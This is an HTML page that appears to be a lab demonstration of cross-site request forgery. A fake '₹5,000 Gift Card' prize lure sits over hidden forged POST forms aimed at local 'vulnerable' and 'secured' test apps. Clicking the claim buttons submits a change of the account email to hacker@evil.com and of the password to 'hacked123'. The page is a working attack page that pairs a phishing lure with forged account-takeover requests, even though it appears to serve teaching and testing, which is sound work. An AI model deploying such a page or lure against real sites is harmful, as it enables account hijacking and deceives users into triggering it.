<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>🎁 Congratulations! You Won a Gift Card</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
      color: #1e293b;
    }
    .box {
      background: #ffffff;
      border-radius: 16px;
      padding: 36px 32px;
      max-width: 580px;
      width: 100%;
      box-shadow: 0 20px 45px rgba(180, 83, 9, 0.15);
      text-align: center;
    }
    .pill {
      display: inline-block;
      background: #fef3c7;
      color: #b45309;
      border: 1px solid #fde68a;
      font-size: 12px;
      font-weight: 700;
      padding: 4px 12px;
      border-radius: 999px;
      margin-bottom: 12px;
    }
    h1 { margin: 0 0 10px; font-size: 26px; }
    p { color: #475569; line-height: 1.6; font-size: 15px; }
    .btn {
      display: inline-block;
      margin: 8px 6px;
      padding: 14px 24px;
      border: 0;
      border-radius: 10px;
      font-size: 15px;
      font-weight: 700;
      color: #fff;
      cursor: pointer;
      transition: transform 0.1s ease;
    }
    .btn:active { transform: scale(0.98); }
    .btn-attack { background: #ea580c; }
    .btn-attack:hover { background: #c2410c; }
    .btn-secured { background: #475569; }
    .btn-secured:hover { background: #334155; }
    hr { border: 0; border-top: 1px solid #e2e8f0; margin: 24px 0; }
    .payload-box {
      text-align: left;
      background: #0f172a;
      color: #e2e8f0;
      padding: 14px 16px;
      border-radius: 10px;
      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
      font-size: 12px;
      line-height: 1.6;
      overflow-x: auto;
      margin-top: 12px;
    }
    .payload-title {
      text-align: left;
      font-size: 12px;
      font-weight: 700;
      color: #64748b;
      text-transform: uppercase;
      letter-spacing: 0.4px;
    }
    .note { font-size: 13px; color: #64748b; }
  </style>
</head>
<body>
  <div class="box">
    <h1>🎁 You Won a ₹5,000 Gift Card!</h1>
    <p>Click the button below to claim your reward instantly.</p>

    <!-- Hidden Forged POST Form #1: Targets Vulnerable App (Port 3000) -->
    <form id="csrf-vuln" method="POST" action="http://localhost:3000/account/update" style="display:none;">
      <input type="hidden" name="email" value="hacker@evil.com">
      <input type="hidden" name="newPassword" value="hacked123">
    </form>
    <button class="btn btn-attack" onclick="document.getElementById('csrf-vuln').submit()">
      🎁 Claim Prize Now!
    </button>

    <hr>

    <!-- Hidden Forged POST Form #2: Targets Secured App (Port 3001) -->
    <form id="csrf-sec" method="POST" action="http://localhost:3001/account/update" style="display:none;">
      <input type="hidden" name="email" value="hacker@evil.com">
      <input type="hidden" name="newPassword" value="hacked123">
    </form>
    <button class="btn btn-secured" onclick="document.getElementById('csrf-sec').submit()">
      🎁 Claim Prize (Secured Target :3001)
    </button>
  </div>
</body>
</html>
